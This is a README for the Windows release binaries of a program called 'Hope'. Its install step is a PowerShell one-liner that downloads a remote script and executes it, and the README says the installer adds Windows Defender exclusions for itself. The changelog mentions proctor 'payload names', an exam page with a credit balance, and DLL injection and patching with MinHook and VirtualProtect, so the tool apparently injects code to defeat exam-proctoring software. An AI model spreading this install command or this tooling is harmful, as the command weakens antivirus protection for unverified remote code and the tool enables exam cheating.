# Hope — release binaries

Download host for Hope. The source lives in a separate private repository.

## How to Install

Get Hope running on Windows. Install with one command.

### 1 — Open Command Prompt

Press **Win + R**, type `cmd`, and hit Enter. Or search for "Command Prompt" in the Start menu.

### 2 — Paste the Command

Copy the command below and paste it into your Command Prompt window. Right-click to paste.

Paste exactly this (copy the whole line — there is nothing else to type):

```cmd
powershell -Command "irm https://hope-install.pages.dev/install.ps1 | iex"
```

### 3 — Press Enter & Done!

Hit **Enter**. The Hope installer downloads, verifies its checksum, and asks for admin permission to install itself. A Hope shortcut appears on your Desktop when it's done.

> **What happens when you run this?**
>
> → Finds the newest release for you
> → Verifies the download against its published SHA-256
> → Adds Windows Defender exclusions for you
> → Desktop shortcut when it's done
>
> After this, Hope updates itself on launch — you only install once.

## Details

- **Requirements:** Windows 10/11 (64-bit). No prerequisites — the installer adds the browser runtime silently if it is missing.
- **Install location:** `C:\Program Files\Hope`
- **Uninstall:** *Settings → Apps → Hope 1.3.4 → Uninstall*, or run `C:\Program Files\Hope\unins000.exe`
- **Verify your download:** SHA-256 of `HopeSetup-1.3.4.exe` — `33AC5393B7DD71552A28017F96D3106226AF4FC8BD0106736508ED98A2B860FA`
- **Prefer a manual download?** Take `HopeSetup-1.3.4.exe` from the [latest release](https://github.com/muleimm/h-releases/releases/latest) and run it.

## What's new in 1.3.4

- **Fixed: false coverage FAILs after any 32-bit target.** The coverage check inherited the last-served architecture, so on a 64-bit proctor it tested the x86 payload names and reported `present=0/4` before self-correcting a fraction of a second later. It now always builds the 64-bit set.
- Exam page header: the credit balance centres on the header rather than the gap before the right-hand controls, so it no longer drifts.
- "Exit" in the session-end messages is now "End session", matching the control it points at.
- `Dll1` bootstrap release stays off — tried, then backed out after `SoftLandingTask.exe` took `c0000005` in `ntdll` ten seconds after release. `Dll1` does its own patching with `VirtualProtect` rather than restoring through MinHook.
- The duel hotkeys (Alt+D / Alt+H) are Workspace-only by design, now documented where the gate is applied.
- Verified: smoke 13/13, no new WER.

Latest release: [v1.3.4](https://github.com/muleimm/h-releases/releases/tag/v1.3.4) · All releases are kept and never overwritten.

